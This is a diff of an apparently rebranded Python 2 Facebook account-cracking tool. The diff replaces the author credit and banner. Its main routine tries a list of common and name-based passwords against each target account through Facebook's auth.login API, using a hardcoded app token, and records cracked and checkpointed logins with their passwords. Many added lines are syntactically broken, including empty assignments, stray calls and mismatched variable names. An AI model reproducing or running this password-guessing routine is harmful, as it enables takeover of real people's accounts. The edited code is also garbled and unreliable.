@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # coding=utf-8
-# Originally Written By:Muhammad Hamza
+# Originally Written By: Shadow_hacker
 # Source : Python2"
 # Donot Recode It. 
 
@@ -57,19 +57,38 @@ def hopss(z):
 		sys.stdout.flush()
 		time.sleep(0.1)
 ##### LOGO #####
-banner = """
-\033[1;92m___  ____   _ _____ _   __  ___   _   _ 
-\033[1;92m|  \/  | | | /  ___| | / / / _ \ | \ | |
-\033[1;92m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
-\033[1;92m| |\/| | | | |`--. \    \ |  _  || . ` |
-\033[1;92m| |  | | |_| /\__/ / |\  \| | | || |\  |
-\033[1;92m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/                                               
+banner = """ 
+
+░██████╗██╗░░░██╗░█████╗░░█████╗░
+
+██╔════╝╚██╗░██╔╝██╔══██╗██╔══██╗
+
+╚█████╗░░╚████╔╝░██║░░╚═╝██║░░██║
+
+░╚═══██╗░░╚██╔╝░░██║░░██╗██║░░██║
+
+██████╔╝░░░██║░░░╚█████╔╝╚█████╔╝
+
+╚═════╝░░░░╚═╝░░░░╚════╝░░╚════╝░
+
+████████╗██████╗░██╗░█████╗░██╗░░██╗███████╗
+
+╚══██╔══╝██╔══██╗██║██╔══██╗██║░██╔╝██╔════╝
+
+░░░██║░░░██████╔╝██║██║░░╚═╝█████═╝░█████╗░░
+
+░░░██║░░░██╔══██╗██║██║░░██╗██╔═██╗░██╔══╝░░
+
+░░░██║░░░██║░░██║██║╚█████╔╝██║░╚██╗███████╗
+
+░░░╚═╝░░░╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝
+                                               
 \033[1;97m-----------------------------------------------
-\033[1;91m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
-\033[1;91m➣ Github  : https://github.com/muskanckg
-\033[1;91m➣ GANG    : CRAZY KING GANG
-\033[1;91m➣ Youtube : JAM SHAHRUKH TECHNICAL
-\033[1;91m➣ WhatsApp: +923053176060
+\033[1;91m➣ OWNER   : Syco Tricker X hacker
+\033[1;91m➣ Github  : https://github.com/Shadow hacker
+\033[1;91m➣ GANG    : Alone Coder 
+\033[1;91m➣ Youtube : Master In Ethical Hacking
+\033[1;91m➣ WhatsApp: No whtsapp 
 \033[1;97m-----------------------------------------------"""
 # titik #
 def tik():
@@ -123,7 +142,7 @@ def menu():
 	print "[2] Clone With Pass Choice."
 	print "[3] Grabbing Tools."
 	print "[4] Auto Del Tools."
-	print "[5] Update jam Tool."
+	print "[5] Update Syco Tool."
 	print "[6] Follow Me On Facebook."
 	print "[7] Logout"
 	print ('                  ')
@@ -134,11 +153,11 @@ def men():
 	if rana =="":
 		print " Wrong Input"
 		men()
-	elif rana =="1":
+	elif syco =="1":
 		crack()
-	elif rana =="2":
+	elif syco =="2":
 	    os.system('clear')
-	    hamza('[!] Please Wait While Page Is Loding.')
+	    syco('[!] Please Wait While Page Is Loding.')
 	    hopss('CKG-10%...')
 	    hopss('CKG-20%...')
 	    hopss('CKG-50%...')
@@ -147,25 +166,25 @@ def men():
 	    hopss('CKG-95%...')
 	    os.system('python2 .choice.py')
 	    time.sleep(1)
-	elif rana =="3":
+	elif syco =="3":
 		grab()
-	elif rana =="4":
+	elif syco =="4":
 		bot()
 	elif rana =="5":
 		os.system('clear')
 		print banner
-		hamza('[✓] Please Wait While Tool Is Updating')
+		('[✓] Please Wait While Tool Is Updating')
 		os.system('git pull origin master')
-		hamza('[✓] Tool Has Been Update Successfully')
-		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
+		('[✓] Tool Has Been Update Successfully')
+		('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
 		time.sleep(3)
-		os.hamza('python2 jam.py')
+		os.syco('python2 jam.py')
 	elif rana =="6":
-		os.system('xdg-open https://www.facebook.com/jam.shahrukh124')
+		os.system('xdg-open https://www.facebook.com/errorhacker')
 		menu()
 	elif rana =="7":
 		os.system('rm -rf login.txt')
-		hamza('[✓] Logged Out Successfully')
+		('[✓] Logged Out Successfully')
 		os.system('python2 jam.py')
 	else:
 		print "[!] Wrong Input"
@@ -210,7 +229,7 @@ def crack_menu():
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			hamza('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
+			('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
 		except KeyError:
 			print"[!] ID Not Found!"
 			raw_input("\nPress Enter To Back  ")
@@ -239,11 +258,11 @@ def crack_menu():
 		print "Filled Incorrectly"
 		crack_menu()
 	
-        hamza('[✓] Total Friends: '+str(len(id)))
+        syco('[✓] Total Friends: '+str(len(id)))
         time.sleep(0.5)
-	hamza('[✓] The Process Has Been Started.')
+	('[✓] The Process Has Been Started.')
 	time.sleep(0.5)
-        hamza('[!] To Stop Process Press CTRL Then Z')
+        syco('[!] To Stop Process Press CTRL Then Z')
         time.sleep(0.5)
         print (47*"-")
      
@@ -260,60 +279,60 @@ def crack_menu():
 		try:
 			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
 			b = json.loads(a.text)
-			pass1='786786'
+			pass1='Pakistan123'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
+				print '\x1b[1;96mhack[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
-					crt = open("save/checkpoint.txt", "a")
-					crt.write(user+"|"+pass1+"\n")
-					crt.close()
-					checkpoint.append(user+pass1)
+					print '\x1b[1;91m(4Days)[\x1b[1;91mSuceessful\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
+					 = open("save/checkpoint.txt", "a")
+					(user+"|"+pass1+"\n")
+					()
+					.append(user+pass1)
 				else:
 					pass2 = 'Pakistan'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
-						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
+						print '\x1b[1;96m(hack)[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
-							crt = open("save/checkpoint.txt", "a")
-							crt.write(user+"|"+pass2+"\n")
-							crt.close()
+							print '\x1b[1;91m4Days[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
+							 = open("save/checkpoint.txt", "a")
+							(user+"|"+pass2+"\n")
+							.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = '000786'
+							pass3 = 'Aleem786'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
-								print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass3
+								print '\x1b[1;96m(hack)[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass3
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass3
-									crt = open("save/checkpoint.txt", "a")
-									crt.write(user+"|"+pass3+"\n")
-									crt.close()
+									print '\x1b[1;91m4Days[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass3
+									 = open("save/checkpoint.txt", "a")
+									(user+"|"+pass3+"\n")
+									()
 									checkpoint.append(user+pass3)
 								else:
 									pass4 = b['first_name'] + '123'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
-										print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass4
+										print '\x1b[1;96mhack[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass4
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass4
-											crt = open("save/checkpoint.txt", "a")
-											crt.write(user+"|"+pass4+"\n")
-											crt.close()
+											print '\x1b[1;91m4Days[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass4
+											 = open("save/checkpoint.txt", "a")
+											(user+"|"+pass4+"\n")
+											()
 											checkpoint.append(user+pass4)
 										else:
 											pass5 = b['first_name'] + '12345'
@@ -325,9 +344,9 @@ def crack_menu():
 											else:
 												if "www.facebook.com" in q["error_msg"]:
 													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass5
-													crt = open("save/checkpoint.txt", "a")
-													crt.write(user+"|"+pass5+"\n")
-													crt.close()
+													 = open("save/checkpoint.txt", "a")
+													(user+"|"+pass5+"\n")
+													()
 													checkpoint.append(user+pass5)
 												else:
 													pass6 = b['first_name'] + '1122'
@@ -339,12 +358,12 @@ def crack_menu():
 													else:
 														if "www.facebook.com" in q["error_msg"]:
 															print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass6
-															crt = open("save/checkpoint.txt", "a")
-															crt.write(user+"|"+pass6+"\n")
-															crt.close()
+															 = open("save/checkpoint.txt", "a")
+															(user+"|"+pass6+"\n")
+															()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = b['first_name'] + '786'
+															pass7 = b['first_name'] + '12'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
@@ -353,9 +372,9 @@ def crack_menu():
 															else:
 																if "www.facebook.com" in q["error_msg"]:
 																	print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass7
-																	crt = open("save/checkpoint.txt", "a")
-																	crt.write(user+"|"+pass7+"\n")
-																	crt.close()
+																	 = open("save/checkpoint.txt", "a")
+																	(user+"|"+pass7+"\n")
+																	()
 																	checkpoint.append(user+pass7)           					
 								                                       
 				                                                                           
